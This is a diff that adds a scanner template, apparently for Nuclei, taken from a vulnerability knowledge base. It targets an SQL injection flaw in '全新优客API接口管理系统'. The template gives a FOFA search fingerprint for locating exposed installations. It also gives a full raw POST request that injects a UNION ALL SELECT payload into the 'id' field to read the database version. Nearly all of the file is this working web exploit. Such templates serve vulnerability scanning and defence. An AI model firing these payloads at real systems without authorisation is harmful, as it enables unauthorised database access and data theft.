@@ -1,0 +1,35 @@
+id: poc-hcsb8f8ooaaverpr
+info:
+  name: 全新优客API接口管理系统 doc 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hcsb8f8ooaaverpr'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hcsb8f8ooaaverpr
+    fofa: body="public/static/index/css/flaghome.css"
+http:
+- raw:
+  - 'POST /index/index/doc HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Connection: close
+
+    id='') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,@@VERSION,NULL-- -'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
